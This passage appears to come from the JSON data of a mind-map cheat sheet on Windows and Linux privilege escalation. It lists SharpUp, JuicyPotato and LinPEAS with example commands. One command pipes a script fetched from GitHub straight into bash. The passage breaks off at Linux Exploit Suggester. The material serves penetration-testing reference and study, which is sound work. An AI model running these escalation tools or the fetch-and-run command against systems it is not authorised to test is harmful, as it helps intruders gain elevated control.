vilege Escalation</strong>","children":[{"content":"\n<p data-lines=\"135,136\"><strong>SharpUp</strong>:</p>","children":[{"content":"<em>Purpose</em>: Identify privilege escalation opportunities on Windows systems.","children":[],"payload":{"lines":"136,137"}},{"content":"<em>Example Command</em>:<pre><code class=\"language-bash\">SharpUp.exe\n</code></pre>\nScans for misconfigurations and vulnerabilities exploitable for privilege escalation.","children":[],"payload":{"lines":"137,143"}}],"payload":{"lines":"135,143"}},{"content":"\n<p data-lines=\"143,144\"><strong>JuicyPotato</strong>:</p>","children":[{"content":"<em>Purpose</em>: Escalate privileges using COM impersonation.","children":[],"payload":{"lines":"144,145"}},{"content":"<em>Example Command</em>:<pre><code class=\"language-bash\">JuicyPotato.exe -l 9000 -p C:\\Windows\\System32\\calc.exe\n</code></pre>\nSpawns a system shell by exploiting COM impersonation.","children":[],"payload":{"lines":"145,151"}}],"payload":{"lines":"143,151"}}],"payload":{"lines":"134,135"}},{"content":"<strong>Linux Privilege Escalation</strong>","children":[{"content":"\n<p data-lines=\"152,153\"><strong>LinPEAS</strong>:</p>","children":[{"content":"<em>Purpose</em>: Automates the identification of privilege escalation vectors on Linux systems.","children":[],"payload":{"lines":"153,154"}},{"content":"<em>Example Command</em>:<pre><code class=\"language-bash\">bash -c <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(curl -fsSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh)</span>\"</span>\n</code></pre>\nExecutes a script that scans for escalation opportunities.","children":[],"payload":{"lines":"154,160"}}],"payload":{"lines":"152,160"}},{"content":"\n<p data-lines=\"160,161\"><strong>Linux Exploit Suggester</strong>:</p>","children":[{"content":"<em>Purpose</em>: Suggest applicable kernel exploits for privilege escalation.","children":[],"payload":{"lines":"161,162"}},{"content
